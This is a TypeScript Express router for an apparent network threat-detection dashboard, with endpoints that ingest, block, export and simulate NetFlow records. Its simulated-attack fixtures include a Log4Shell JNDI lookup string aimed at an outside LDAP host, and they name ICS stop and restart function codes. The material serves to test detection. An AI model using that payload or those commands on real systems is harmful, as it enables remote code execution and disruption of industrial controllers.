      list = list.filter(f => f.status === status);
    }
    if (search && typeof search === 'string') {
      const q = search.toLowerCase();
      list = list.filter(f =>
        f.srcIp.toLowerCase().includes(q) ||
        f.dstIp.toLowerCase().includes(q) ||
        (f.srcDeviceName && f.srcDeviceName.toLowerCase().includes(q)) ||
        (f.dstDeviceName && f.dstDeviceName.toLowerCase().includes(q)) ||
        (f.signatureMatch && f.signatureMatch.signatureName.toLowerCase().includes(q)) ||
        (f.signatureMatch && f.signatureMatch.signatureId.toLowerCase().includes(q))
      );
    }

    const limitNum = Math.min(200, Math.max(1, parseInt(String(limit || '50'), 10)));
    res.json({
      success: true,
      totalCount: list.length,
      flows: list.slice(0, limitNum),
      timestamp: new Date().toISOString()
    });
  });

  // 12.2 GET /api/v1/network/flows/stats (NetFlow & Threat Telemetry Summary)
  router.get('/flows/stats', (req: Request, res: Response) => {
    const flows = globalFlowCollectorEngine.getFlows();
    const totalFlows = flows.length;
    const activeFlows = flows.filter(f => f.status === 'active').length;
    const maliciousFlows = flows.filter(f => f.threatLevel === 'malicious').length;
    const suspiciousFlows = flows.filter(f => f.threatLevel === 'suspicious').length;
    const totalBytes = flows.reduce((sum, f) => sum + (f.bytes || 0), 0);
    const totalPackets = flows.reduce((sum, f) => sum + (f.packets || 0), 0);
    const totalThroughputBps = flows.filter(f => f.status === 'active').reduce((sum, f) => sum + (f.bps || 0), 0);

    // Protocol distribution
    const protocolBreakdown = flows.reduce((acc: any, f) => {
      acc[f.protocol] = (acc[f.protocol] || 0) + 1;
      return acc;
    }, {});

    // Active attack signatures catalog
    const activeSignaturesMap: Record<string, { signatureId: string; name: string; count: number; riskScore: number; mitreTTP: string }> = {};
    flows.forEach(f => {
      if (f.signatureMatch && f.status === 'active') {
        const id = f.signatureMatch.signatureId;
        if (!activeSignaturesMap[id]) {
          activeSignaturesMap[id] = {
            signatureId: id,
            name: f.signatureMatch.signatureName,
            count: 0,
            riskScore: f.signatureMatch.riskScore,
            mitreTTP: f.signatureMatch.mitreTTP
          };
        }
        activeSignaturesMap[id].count += 1;
      }
    });

    const collectorMetrics = globalFlowCollectorEngine.getMetrics();

    res.json({
      success: true,
      totalFlows,
      activeFlows,
      maliciousFlows,
      suspiciousFlows,
      totalBytes,
      totalPackets,
      totalThroughputBps,
      totalThroughputGbps: Number((totalThroughputBps / 1000000000).toFixed(2)),
      protocolBreakdown,
      activeSignatures: Object.values(activeSignaturesMap),
      collectorEngine: collectorMetrics
    });
  });

  // 12.3 POST /api/v1/network/flows/ingest (Ingest Raw NetFlow Record with Auto-Signature Evaluation)
  router.post('/flows/ingest', (req: Request, res: Response) => {
    const raw = req.body;
    if (!raw || !raw.srcIp || !raw.dstIp) {
      return res.status(400).json({ error: 'Missing srcIp or dstIp in flow record' });
    }

    const { threatLevel, signatureMatch } = evaluateFlowThreat(raw);

    const newFlow: NetworkFlowRecord = {
      id: `flow-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
      timestamp: raw.timestamp || new Date().toISOString(),
      srcIp: raw.srcIp,
      srcPort: Number(raw.srcPort || 0),
      srcDeviceId: raw.srcDeviceId,
      srcDeviceName: raw.srcDeviceName || raw.srcDeviceId,
      dstIp: raw.dstIp,
      dstPort: Number(raw.dstPort || 0),
      dstDeviceId: raw.dstDeviceId,
      dstDeviceName: raw.dstDeviceName || raw.dstDeviceId,
      protocol: raw.protocol || 'TCP',
      bytes: Number(raw.bytes || 1024),
      packets: Number(raw.packets || 10),
      durationMs: Number(raw.durationMs || 1000),
      flags: raw.flags || ['ACK'],
      bps: Number(raw.bps || (raw.bytes ? raw.bytes * 8 : 8192)),
      pps: Number(raw.pps || (raw.packets ? raw.packets : 10)),
      threatLevel,
      signatureMatch,
      sampledInterface: raw.sampledInterface || 'GigabitEthernet0/1',
      status: 'active'
    };

    networkFlows.unshift(newFlow);
    if (networkFlows.length > 500) networkFlows.pop();

    // If threat detected, update device status to warning
    if (threatLevel === 'malicious') {
      const srcDev = networkDevices.find(d => d.id === newFlow.srcDeviceId || d.ip.includes(newFlow.srcIp));
      if (srcDev) {
        srcDev.status = 'warning';
      }
      const dstDev = networkDevices.find(d => d.id === newFlow.dstDeviceId || d.ip.includes(newFlow.dstIp));
      if (dstDev) {
        dstDev.status = 'warning';
      }

      // Add to audit log
      auditLogs.unshift({
        id: `audit-${Date.now()}`,
        timestamp: new Date().toISOString(),
        deviceId: newFlow.srcDeviceId || 'unknown',
        deviceName: newFlow.srcDeviceName || newFlow.srcIp,
        ip: newFlow.srcIp,
        operator: 'NETFLOW-THREAT-DETECTOR',
        action: 'ATTACK_SIGNATURE_TRIGGERED',
        details: `NetFlow 捕獲特徵碼 [${signatureMatch?.signatureId}] ${signatureMatch?.signatureName}: ${signatureMatch?.description}`,
        status: 'CRITICAL'
      } as any);
    }

    if (broadcastUpdate) {
      broadcastUpdate({ type: 'flow_ingested', flow: newFlow });
    }

    res.json({
      success: true,
      message: threatLevel === 'malicious' ? 'Flow 已入庫並命中高危特徵碼警報' : 'Flow 成功解析入庫',
      flow: newFlow
    });
  });

  // 12.4 POST /api/v1/network/flows/simulate-attack (Simulate Attack Flows for Live Testing)
  router.post('/flows/simulate-attack', (req: Request, res: Response) => {
    const { attackType } = req.body;
    let createdFlow: NetworkFlowRecord;

    switch (attackType) {
      case 'syn_flood':
        createdFlow = {
          id: `flow-sim-syn-${Date.now()}`,
          timestamp: new Date().toISOString(),
          srcIp: '203.0.113.199',
          srcPort: 52100,
          srcDeviceName: 'DDoS-Botnet-Cluster',
          dstIp: '211.23.131.21',
          dstPort: 443,
          dstDeviceId: 'fw-01',
          dstDeviceName: 'Gateway-Firewall-PA',
          protocol: 'TCP',
          bytes: 42000000,
          packets: 320000,
          durationMs: 30000,
          flags: ['SYN'],
          bps: 3800000000,
          pps: 320000,
          threatLevel: 'malicious',
          signatureMatch: {
            signatureId: 'SIG-NET-SYN-009',
            signatureName: '分散式 SYN Flood 流量耗盡型阻斷服務攻擊',
            mitreTTP: 'T1498.001 Direct Network Flood',
            mitreTactic: 'Impact',
            mitreStage: 'Lateral Movement',
            confidence: 96.5,
            riskScore: 8.8,
            description: 'TCP SYN 封包速率高達 320,000 pps，未完成交握半連線佇列溢位',
            cve: 'CWE-400'
          },
          sampledInterface: 'Ethernet1/1 (WAN)',
          status: 'active'
        };
        const fw = networkDevices.find(d => d.id === 'fw-01');
        if (fw) { fw.cpu = 94; fw.status = 'warning'; }
        break;

      case 'modbus_exploit':
        createdFlow = {
          id: `flow-sim-modbus-${Date.now()}`,
          timestamp: new Date().toISOString(),
          srcIp: '10.88.88.103',
          srcPort: 51240,
          srcDeviceId: 'ws-rd-04',
          srcDeviceName: 'WS-RD-DEV-04',
          dstIp: '192.168.100.88',
          dstPort: 502,
          dstDeviceId: 'plc-turb-01',
          dstDeviceName: 'PLC-STATION-TURBINE-02',
          protocol: 'Modbus',
          bytes: 280000,
          packets: 1600,
          durationMs: 8000,
          flags: ['PSH', 'ACK'],
          bps: 280000,
          pps: 200,
          threatLevel: 'malicious',
          signatureMatch: {
            signatureId: 'SIG-ICS-MODBUS-001',
            signatureName: '工控 Modbus/TCP 暫存器未授權覆寫攻擊',
            mitreTTP: 'T0816 Impair Process Control',
            mitreTactic: 'Inhibit Response Function',
            mitreStage: 'Lateral Movement',
            confidence: 99.4,
            riskScore: 9.9,
            description: '非授權 Modbus FC 0x06 指令注入，竄改渦輪機轉速臨界保持暫存器 40012',
            cve: 'ICS-ALERT-2026-MODBUS'
          },
          sampledInterface: 'GigabitEthernet1/0/12 (OT-Diode)',
          status: 'active'
        };
        const rd = networkDevices.find(d => d.id === 'ws-rd-04');
        if (rd) { rd.status = 'warning'; }
        break;

      case 'c2_beacon':
        createdFlow = {
          id: `flow-sim-c2-${Date.now()}`,
          timestamp: new Date().toISOString(),
          srcIp: '10.88.88.106',
          srcPort: 53120,
          srcDeviceId: 'ws-sec-7',
          srcDeviceName: 'SOC-Analyst-WS07',
          dstIp: '198.51.100.15',
          dstPort: 53,
          dstDeviceName: 'Malicious-NS-Command',
          protocol: 'DNS',
          bytes: 480000,
          packets: 3200,
          durationMs: 60000,
          flags: [],
          bps: 64000,
          pps: 53,
          threatLevel: 'malicious',
          signatureMatch: {
            signatureId: 'SIG-C2-BEACON-002',
            signatureName: 'Cobalt Strike 混淆指令與 DNS 隱蔽 C2 通道',
            mitreTTP: 'T1071.004 DNS C2 Tunneling',
            mitreTactic: 'Command and Control',
            mitreStage: 'Privilege Escalation',
            confidence: 98.7,
            riskScore: 9.7,
            description: '端點向惡意 NS 伺服器發出高頻超長 Base32 子網域 DNS 請求，確認為隱蔽 C2 通道',
            cve: 'ATT&CK-T1071'
          },
          sampledInterface: 'GigabitEthernet1/0/24',
          status: 'active'
        };
        const sec7 = networkDevices.find(d => d.id === 'ws-sec-7');
        if (sec7) { sec7.status = 'warning'; }
        break;

      case 'exfiltration':
      default:
        createdFlow = {
          id: `flow-sim-exfil-${Date.now()}`,
          timestamp: new Date().toISOString(),
          srcIp: '10.88.88.103',
          srcPort: 59001,
          srcDeviceId: 'ws-rd-04',
          srcDeviceName: 'WS-RD-DEV-04',
          dstIp: '198.51.100.88',
          dstPort: 443,
          dstDeviceName: 'Ext-Cloud-Mega.nz',
          protocol: 'HTTPS',
          bytes: 15200000000,
          packets: 10400000,
          durationMs: 120000,
          flags: ['ACK', 'PSH'],
          bps: 850000000,
          pps: 86000,
          threatLevel: 'malicious',
          signatureMatch: {
            signatureId: 'SIG-UEBA-EXFIL-007',
            signatureName: '內部異常行為 UEBA 巨量數據雲端外洩',
            mitreTTP: 'T1567.002 Exfiltration to Cloud Storage',
            mitreTactic: 'Exfiltration',
            mitreStage: 'Exfiltration',
            confidence: 99.1,
            riskScore: 9.8,
            description: '向境外網盤高頻上傳 14.1 GB 加密封裝資料，偏離使用者過去 90 天行為基準線',
            cve: 'CWE-200'
          },
          sampledInterface: 'TenGigabitEthernet1/0/1',
          status: 'active'
        };
        const rdev = networkDevices.find(d => d.id === 'ws-rd-04');
        if (rdev) { rdev.status = 'warning'; }
        break;

      case 'log4j':
        createdFlow = {
          id: `flow-sim-log4j-${Date.now()}`,
          timestamp: new Date().toISOString(),
          srcIp: '185.220.101.45',
          srcPort: 48920,
          srcDeviceName: 'Ext-Tor-Exit-Node',
          dstIp: '10.88.88.20',
          dstPort: 8080,
          dstDeviceId: 'srv-app-01',
          dstDeviceName: 'SRV-APP-PROD-01',
          protocol: 'HTTP',
          bytes: 84000,
          packets: 420,
          durationMs: 4500,
          flags: ['PSH', 'ACK'],
          bps: 149300,
          pps: 93,
          threatLevel: 'malicious',
          signatureMatch: {
            signatureId: 'SIG-APTS-LOG4J-008',
            signatureName: 'Log4Shell 遠端程式碼執行與 JNDI 注入攻擊',
            mitreTTP: 'T1190 Exploit Public-Facing Application',
            mitreTactic: 'Initial Access',
            mitreStage: 'Delivery & Weaponization',
            confidence: 99.8,
            riskScore: 10.0,
            description: 'HTTP User-Agent 載入 ${jndi:ldap://185.220.101.45:1389/Exploit} 遠端階層反彈惡意 Shell',
            cve: 'CVE-2021-44228'
          },
          sampledInterface: 'GigabitEthernet1/0/5 (DMZ)',
          status: 'active'
        };
        const appDev = networkDevices.find(d => d.id === 'srv-app-01');
        if (appDev) { appDev.status = 'warning'; appDev.cpu = 89; }
        break;

      case 's7comm_exploit':
        createdFlow = {
          id: `flow-sim-s7-${Date.now()}`,
          timestamp: new Date().toISOString(),
          srcIp: '10.88.88.106',
          srcPort: 52410,
          srcDeviceId: 'ws-sec-7',
          srcDeviceName: 'SOC-Analyst-WS07',
          dstIp: '192.168.100.99',
          dstPort: 102,
          dstDeviceId: 'plc-turb-01',
          dstDeviceName: 'PLC-STATION-TURBINE-02',
          protocol: 'S7Comm',
          bytes: 142000,
          packets: 980,
          durationMs: 6200,
          flags: ['PSH', 'ACK'],
          bps: 183000,
          pps: 158,
          threatLevel: 'malicious',
          signatureMatch: {
            signatureId: 'SIG-ICS-S7COMM-010',
            signatureName: '西門子 S7Comm 工控 PLC 惡意停機指令注入',
            mitreTTP: 'T0815 Denial of Control',
            mitreTactic: 'Inhibit Response Function',
            mitreStage: 'Lateral Movement',
            confidence: 99.7,
            riskScore: 9.9,
            description: 'NetFlow 捕獲未授權 S7Comm (Port 102) 下發 Function 0x29 停機指令，企圖癱瘓產線控制器',
            cve: 'ICS-VU-S7-2026'
          },
          sampledInterface: 'GigabitEthernet1/0/12 (OT-Diode)',
          status: 'active'
        };
        const plcDev = networkDevices.find(d => d.id === 'plc-turb-01');
        if (plcDev) { plcDev.status = 'warning'; }
        break;

      case 'recon_scan':
        createdFlow = {
          id: `flow-sim-recon-${Date.now()}`,
          timestamp: new Date().toISOString(),
          srcIp: '10.88.88.103',
          srcPort: 58120,
          srcDeviceId: 'ws-rd-04',
          srcDeviceName: 'WS-RD-DEV-04',
          dstIp: '10.88.88.254',
          dstPort: 445,
          dstDeviceId: 'sw-core-01',
          dstDeviceName: 'Core-Catalyst-9500',
          protocol: 'TCP',
          bytes: 38000,
          packets: 620,
          durationMs: 500,
          flags: ['SYN'],
          bps: 608000,
          pps: 1240,
          threatLevel: 'suspicious',
          signatureMatch: {
            signatureId: 'SIG-NET-SCAN-011',
            signatureName: '高速內網橫向特權通訊埠探測與掃描',
            mitreTTP: 'T1046 Network Service Discovery',
            mitreTactic: 'Discovery',
            mitreStage: 'Recon',
            confidence: 94.2,
            riskScore: 7.8,
            description: '快速探測內網核心目標主機特權通訊埠 445 (SMB)，疑似自動化掃描載荷',
            cve: 'MITRE-T1046'
          },
          sampledInterface: 'TenGigabitEthernet1/0/24',
          status: 'active'
        };
        break;

      case 'dnp3_exploit':
        createdFlow = {
          id: `flow-sim-dnp3-${Date.now()}`,
          timestamp: new Date().toISOString(),
          srcIp: '10.88.88.106',
          srcPort: 51920,
          srcDeviceId: 'ws-sec-7',
          srcDeviceName: 'SOC-Analyst-WS07',
          dstIp: '192.168.100.99',
          dstPort: 20000,
          dstDeviceId: 'plc-turb-01',
          dstDeviceName: 'PLC-STATION-TURBINE-02',
          protocol: 'DNP3',
          bytes: 84200,
          packets: 410,
          durationMs: 3100,
          flags: ['PSH', 'ACK'],
          bps: 217000,
          pps: 132,
          threatLevel: 'malicious',
          signatureMatch: {
            signatureId: 'SIG-ICS-DNP3-015',
            signatureName: '工控 DNP3 變電所協議非授權冷暖重開指令',
            mitreTTP: 'T0814 Denial of Service for Control',
            mitreTactic: 'Inhibit Response Function',
            mitreStage: 'Lateral Movement',
            confidence: 99.8,
            riskScore: 9.9,
            description: '電網 SCADA 遙測連線 (Port 20000) 捕獲 Function 0x0D Cold Restart 強制重啟指令',
            cve: 'ICS-VU-DNP3-2026'
          },
          sampledInterface: 'GigabitEthernet1/0/12 (OT-Diode)',
          status: 'active'
        };
        const dnp3Dev = networkDevices.find(d => d.id === 'plc-turb-01');
        if (dnp3Dev) { dnp3Dev.status = 'warning'; }
        break;

      case 'rdp_brute':
        createdFlow = {
          id: `flow-sim-rdp-${Date.now()}`,
          timestamp: new Date().toISOString(),
          srcIp: '198.51.100.44',
          srcPort: 49210,
          srcDeviceName: 'Ext-Host-Bot',
          dstIp: '10.88.88.20',
          dstPort: 3389,
          dstDeviceId: 'srv-app-01',
          dstDeviceName: 'SRV-APP-PROD-01',
          protocol: 'TCP',
          bytes: 940000,
          packets: 4800,
          durationMs: 42000,
          flags: ['ACK', 'PSH'],
          bps: 179000,
          pps: 114,
          threatLevel: 'malicious',
          signatureMatch: {
            signatureId: 'SIG-BRUTE-RDP-012',
            signatureName: 'RDP / SMB 遠端桌面連線暴力密碼破解',
            mitreTTP: 'T1110.001 Password Guessing',
            mitreTactic: 'Credential Access',
            mitreStage: 'Lateral Movement',
            confidence: 98.1,
            riskScore: 8.9,
            description: 'RDP (Port 3389) 階段捕獲連續 NLA/CredSSP 憑證嘗試循環，超過警戒門檻',
            cve: 'MITRE-T1110'
          },
          sampledInterface: 'Ethernet1/1 (WAN)',
          status: 'active'
        };
        const rdpDev = networkDevices.find(d => d.id === 'srv-app-01');
        if (rdpDev) { rdpDev.status = 'warning'; }
        break;
    }

    networkFlows.unshift(createdFlow);

    // Audit log
    auditLogs.unshift({
      id: `audit-${Date.now()}`,
      timestamp: new Date().toISOString(),
      deviceId: createdFlow.srcDeviceId || 'simulated',
      deviceName: createdFlow.srcDeviceName || 'Simulated-Node',
      ip: createdFlow.srcIp,
      operator: 'SIMULATION-INJECTOR',
      action: 'FLOW_ATTACK_SIMULATED',
      details: `注入模擬攻擊 Flow [${createdFlow.signatureMatch?.signatureId}] ${createdFlow.signatureMatch?.signatureName}`,
      status: 'CRITICAL'
    } as any);

    if (broadcastUpdate) {
      broadcastUpdate({ type: 'flow_attack_simulated', flow: createdFlow });
    }

    res.json({
      success: true,
      message: `已成功注入 ${createdFlow.signatureMatch?.signatureName}，NetFlow 收集器與拓撲引擎已即時捕獲！`,
      flow: createdFlow
    });
  });

  // 12.5 POST /api/v1/network/flows/:id/block (1-Click Drop / Block Malicious Flow)
  router.post('/flows/:id/block', (req: Request, res: Response) => {
    const { id } = req.params;
    const flow = networkFlows.find(f => f.id === id);
    if (!flow) {
      return res.status(404).json({ error: 'Flow record not found' });
    }

    flow.status = 'blocked';
    flow.threatLevel = 'normal';

    // Check if originating device has any other active malicious flows
    const otherMalicious = networkFlows.some(f => (f.srcDeviceId === flow.srcDeviceId || f.srcIp === flow.srcIp) && f.status === 'active' && f.threatLevel === 'malicious');
    if (!otherMalicious && flow.srcDeviceId) {
      const dev = networkDevices.find(d => d.id === flow.srcDeviceId);
      if (dev && dev.vlan !== 999) {
        dev.status = 'online';
      }
    }

    // Add to audit trail
    auditLogs.unshift({
      id: `audit-${Date.now()}`,
      timestamp: new Date().toISOString(),
      deviceId: flow.srcDeviceId || 'unknown',
      deviceName: flow.srcDeviceName || flow.srcIp,
      ip: flow.srcIp,
      operator: 'SOC-NETWORK-ANALYST',
      action: 'FLOW_DROPPED_BLOCKED',
      details: `已在交換機/防火牆下發 ACL 阻斷流 [${flow.id}]: ${flow.srcIp}:${flow.srcPort} -> ${flow.dstIp}:${flow.dstPort} (${flow.signatureMatch?.signatureName || 'Threat Flow'})`,
      status: 'RESOLVED'
    } as any);

    if (broadcastUpdate) {
      broadcastUpdate({ type: 'flow_blocked', flowId: id });
    }

    res.json({
      success: true,
      message: `威脅 Flow ${id} 已由核心交換機/防火牆 ACL 即時阻斷丟棄！`,
      flow
    });
  });

  // 12.6 POST /api/v1/network/flows/clear-threats (Reset All Malicious Flows)
  router.post('/flows/clear-threats', (req: Request, res: Response) => {
    networkFlows.forEach(f => {
      if (f.threatLevel === 'malicious') {
        f.status = 'blocked';
      }
    });

    networkDevices.forEach(d => {
      if (d.vlan !== 999 && d.cpu < d.cpuThreshold) {
        d.status = 'online';
      }
    });

    res.json({
      success: true,
      message: '全網惡意 Flow 威脅已全數清除並恢復正常連線狀態',
      activeMaliciousCount: 0
    });
  });

  // 12.7 GET /api/v1/network/signatures (Full Attack Signatures Catalog)
  router.get('/signatures', (_req: Request, res: Response) => {
    const catalog = globalAttackSignatureEngine.getSignaturesCatalog();
    res.json({
      success: true,
      totalCount: catalog.length,
      signatures: catalog,
      engineVersion: 'SEMOR Deep Signature Inspection Engine v5.0-ICS-NDR'
    });
  });

  // 12.8 POST /api/v1/network/flows/parse-signature (Interactive Flow & Payload Signature Parser)
  router.post('/flows/parse-signature', (req: Request, res: Response) => {
    const { rawText, protocol, srcIp, dstIp, srcPort, dstPort, flags, bytes, pps } = req.body;
    const textToAnalyze = rawText || `Flow [${protocol || 'TCP'}] ${srcIp || '10.88.88.105'}:${srcPort || 50000} -> ${dstIp || '192.168.100.88'}:${dstPort || 80}`;
    
    // Evaluate via AttackSignatureEngine
    const customResult = globalAttackSignatureEngine.parseCustomLog(textToAnalyze, {
      remoteIP: srcIp,
      protocol,
      dstPort: Number(dstPort || 0)
    });

    // Also evaluate via Flow Heuristics
    const flowEvaluation = evaluateFlowThreat({
      protocol: protocol || 'TCP',
      srcIp: srcIp || '10.88.88.105',
      dstIp: dstIp || '192.168.100.88',
      srcPort: Number(srcPort || 50000),
      dstPort: Number(dstPort || 80),
      flags: Array.isArray(flags) ? flags : ['SYN', 'ACK'],
      bytes: Number(bytes || 1024),
      pps: Number(pps || 10)
    });

    const isSignatureHit = (customResult && customResult.signatureId !== 'SIG-HEURISTIC-GENERIC') || flowEvaluation.threatLevel !== 'normal';

    res.json({
      success: true,
      matched: isSignatureHit,
      detectionResult: customResult,
      flowEvaluation,
      analyzedInput: {
        rawText: textToAnalyze,
        protocol: protocol || 'TCP',
        srcIp: srcIp || '10.88.88.105',
        dstIp: dstIp || '192.168.100.88',
        srcPort: Number(srcPort || 50000),
        dstPort: Number(dstPort || 80)
      },
      timestamp: new Date().toISOString()
    });
  });

  // 12.9 POST /api/v1/network/flows/batch-ingest (High-Throughput Batch Ingestion for Collector Core)
  router.post('/flows/batch-ingest', (req: Request, res: Response) => {
    const { flows: incomingFlows } = req.body;
    if (!Array.isArray(incomingFlows) || incomingFlows.length === 0) {
      return res.status(400).json({ error: 'flows must be a non-empty array' });
    }

    const processedFlows: NetworkFlowRecord[] = [];
    let maliciousCount = 0;

    for (const raw of incomingFlows) {
      if (!raw.srcIp || !raw.dstIp) continue;
      const { threatLevel, signatureMatch } = evaluateFlowThreat(raw);
      if (threatLevel === 'malicious') maliciousCount++;

      const flowRecord: NetworkFlowRecord = {
        id: raw.id || `flow-batch-${Date.now()}-${Math.floor(Math.random() * 10000)}`,
        timestamp: raw.timestamp || new Date().toISOString(),
        srcIp: raw.srcIp,
        srcPort: Number(raw.srcPort || 0),
        srcDeviceId: raw.srcDeviceId,
        srcDeviceName: raw.srcDeviceName || raw.srcDeviceId,
        dstIp: raw.dstIp,
        dstPort: Number(raw.dstPort || 0),
        dstDeviceId: raw.dstDeviceId,
        dstDeviceName: raw.dstDeviceName || raw.dstDeviceId,
        protocol: raw.protocol || 'TCP',
        bytes: Number(raw.bytes || 1024),
        packets: Number(raw.packets || 10),
        durationMs: Number(raw.durationMs || 1000),
        flags: raw.flags || ['ACK'],
        bps: Number(raw.bps || (raw.bytes ? raw.bytes * 8 : 8192)),
        pps: Number(raw.pps || (raw.packets ? raw.packets : 10)),
        threatLevel,
        signatureMatch,
        sampledInterface: raw.sampledInterface || 'VLAN 1 Management',
        status: raw.status || 'active'
      };

      processedFlows.push(flowRecord);
    }

    // Prepend batch to in-memory flow ring buffer
    networkFlows.unshift(...processedFlows);
    if (networkFlows.length > 500) {
      networkFlows.splice(500, networkFlows.length - 500);
    }

    if (broadcastUpdate && processedFlows.length > 0) {
      broadcastUpdate({ type: 'flows_batch_ingested', count: processedFlows.length, maliciousCount });
    }

    res.json({
      success: true,
      ingestedCount: processedFlows.length,
      maliciousCount,
      totalActiveFlows: networkFlows.filter(f => f.status === 'active').length,
      timestamp: new Date().toISOString()
    });
  });

  // 12.10 GET /api/v1/network/flows/export (Export Flow Table as CSV for Wireshark & SIEM)
  router.get('/flows/export', (req: Request, res: Response) => {
    const { threatLevel, protocol, status } = req.query;
    let exportList = [...networkFlows];

    if (threatLevel && threatLevel !== 'all') {
      exportList = exportList.filter(f => f.threatLevel === threatLevel);
    }
    if (protocol && protocol !== 'all') {
      exportList = exportList.filter(f => f.protocol.toLowerCase() === String(protocol).toLowerCase());
    }
    if (status && status !== 'all') {
      exportList = exportList.filter(f => f.status === status);
    }

    const headers = [
      'Flow_ID', 'Timestamp', 'Source_IP', 'Source_Port', 'Source_Device',
      'Destination_IP', 'Destination_Port', 'Destination_Device', 'Protocol',
      'Bytes', 'Packets', 'Duration_ms', 'BPS', 'PPS', 'Threat_Level',
      'Signature_ID', 'Signature_Name', 'Status', 'Sampled_Interface'
    ];

    const escapeCsv = (val: any) => `"${String(val ?? '').replace(/"/g, '""')}"`;
    const rows = exportList.map(f => [
      f.id,
      f.timestamp,
      f.srcIp,
      f.srcPort,
      f.srcDeviceName || '',
      f.dstIp,
      f.dstPort,
      f.dstDeviceName || '',
      f.protocol,
      f.bytes,
      f.packets,
      f.durationMs,
      f.bps,
      f.pps,
      f.threatLevel,
      f.signatureMatch?.signatureId || '',
      f.signatureMatch?.signatureName || '',
      f.status,
      f.sampledInterface
    ].map(escapeCsv).join(','));

    const csvContent = [headers.join(','), ...rows].join('\r\n');
    const filename = `netflow_export_${Date.now()}.csv`;

    res.setHeader('Content-Type', 'text/csv; charset=utf-8');
    res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
    res.send('\uFEFF' + csvContent);
  });

  // 12.11 Flow Collector Engine API (Status, Controls, Interfaces, Ingest)
  // GET /api/v1/network/flows/collector/status (Collector Real-time Telemetry & Health)
  router.get('/flows/collector/status', (_req: Request, res: Response) => {
    res.json({
      success: true,
      metrics: globalFlowCollectorEngine.getMetrics(),
      config: globalFlowCollectorEngine.getConfig(),
      timestamp: new Date().toISOString()
    });
  });

  // POST /api/v1/network/flows/collector/toggle (Start/Pause Live Flow Ingestion)
  router.post('/flows/collector/toggle', (_req: Request, res: Response) => {
    const isRunning = globalFlowCollectorEngine.toggle();
    res.json({
      success: true,
      isRunning,
      flowProbeActive: isRunning,
      message: isRunning 
        ? 'NetFlow/sFlow/IPFIX 即時收集引擎已啟動，開始持續取樣注入全網拓撲' 
        : 'NetFlow/sFlow/IPFIX 即時收集引擎已暫停'
    });
  });

  // Backward compatibility alias for probe-toggle
  router.post('/flows/probe-toggle', (req: Request, res: Response) => {
    const { active } = req.body;
    let isRunning: boolean;
    if (typeof active === 'boolean') {
      if (active) {
        globalFlowCollectorEngine.start();
        isRunning = true;
      } else {
        globalFlowCollectorEngine.stop();
        isRunning = false;
      }
    } else {
      isRunning = globalFlowCollectorEngine.toggle();
    }
    res.json({
      success: true,
      flowProbeActive: isRunning,
      isRunning,
      message: isRunning ? 'NetFlow / IPFIX 探針串流已啟動' : 'NetFlow / IPFIX 探針串流已暫停'
    });
  });

  // PUT /api/v1/network/flows/collector/config (Update Collector Parameters)
  router.put('/flows/collector/config', (req: Request, res: Response) => {
    const { samplingRatio, collectionIntervalMs, maxFlowsBuffer, autoDpiInspection, simulatedTrafficProfile } = req.body;
    globalFlowCollectorEngine.updateConfig({
      samplingRatio,
      collectionIntervalMs: collectionIntervalMs ? Number(collectionIntervalMs) : undefined,
      maxFlowsBuffer: maxFlowsBuffer ? Number(maxFlowsBuffer) : undefined,
      autoDpiInspection,
      simulatedTrafficProfile
    });
    res.json({
      success: true,
      message: 'NetFlow 收集引擎參數已成功更新並即時生效',
      config: globalFlowCollectorEngine.getConfig()
    });
  });

  // GET /api/v1/network/flows/collector/interfaces (Monitored Network Interfaces & Port Counters)
  router.get('/flows/collector/interfaces', (_req: Request, res: Response) => {
    res.json({
      success: true,
      interfaces: globalFlowCollectorEngine.getInterfaces(),
      count: globalFlowCollectorEngine.getInterfaces().length,
      timestamp: new Date().toISOString()
    });
  });

  // POST /api/v1/network/flows/collector/flush (Flush In-Memory Flow Buffer)
  router.post('/flows/collector/flush', (_req: Request, res: Response) => {
    globalFlowCollectorEngine.flush();
    res.json({
      success: true,
      message: 'NetFlow 收集器記憶體緩衝已重置為基準線初始狀態'
    });
  });

  // POST /api/v1/network/flows/collector/inject-sample (Inject Custom Synthetic Flow)
  router.post('/flows/collector/inject-sample', (req: Request, res: Response) => {
    const newFlow = globalFlowCollectorEngine.ingestManualFlow(req.body);
    res.json({
      success: true,
      message: '自訂測試 Flow 記錄已成功注入收集器佇列',
      flow: newFlow
    });
  });

  return router;
}
